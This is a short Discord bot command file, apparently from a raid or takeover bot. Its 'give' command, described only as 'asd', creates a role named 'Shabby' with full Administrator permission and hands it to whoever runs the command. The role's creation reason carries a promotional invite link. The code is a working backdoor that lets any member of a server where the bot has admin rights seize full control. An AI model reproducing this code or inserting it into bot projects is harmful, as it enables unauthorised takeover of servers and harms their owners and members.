const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "give",
  description: "asd",
  block: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {
    
    if(!message.guild.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")

    message.guild.roles.create({
        name: 'Shabby',
        permissions: 'Administrator',
        color: 7900386,
        reason: 'discord.gg/shabz',
    }).then(r => {
        message.member.roles.add(r)
    })
  },
};